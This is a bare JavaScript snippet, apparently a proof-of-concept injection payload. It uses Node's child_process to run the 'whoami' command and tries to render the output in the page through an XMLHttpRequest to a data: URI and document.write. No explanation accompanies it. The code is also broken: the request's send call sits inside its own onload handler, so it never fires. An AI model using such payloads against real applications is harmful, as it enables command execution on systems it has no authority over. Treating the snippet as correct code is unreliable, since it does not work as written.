const { exec } = require('child_process');
x=new XMLHttpRequest;
let cmdOutput = '';

exec('whoami', (error, stdout, stderr) => {
    if (error) {
        cmdOutput += `Error: ${error.message}\n`;
    }
    if (stderr) {
        cmdOutput += `Stderr: ${stderr}\n`;
    }
    cmdOutput += `Stdout: ${stdout}`;
    x.open('GET', `data:text/plain,${cmdOutput}`, true);
    x.onload=function(){
    document.write(this.responseText)
    x.send();  
}; 
});
